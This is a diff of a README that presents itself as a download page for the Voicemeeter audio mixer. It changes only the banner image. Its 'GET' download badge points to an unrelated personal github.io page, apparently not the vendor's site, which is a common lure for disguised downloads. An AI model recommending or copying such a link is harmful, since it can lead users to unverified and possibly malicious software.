@@ -1,6 +1,6 @@
 # Voicemeeter Audio Mixer — Virtual Sound Routing Tools
 
-![Banner Placeholder](https://static.kvraudio.com/i/b/voicemeeterbanana.jpg)
+![Banner Placeholder](https://voicemeeter.com/wp-content/uploads/VB-Voicemeeter-The-Essential-Podcast-Tool.jpg)
 
 [![GET — Voicemeeter](https://img.shields.io/badge/GET%20%E2%80%94%20Voicemeeter-0078D6?style=for-the-badge&logoColor=white)](https://grentoolhop853.github.io/.github/Voicemeeter-Audio-Mixer)
 
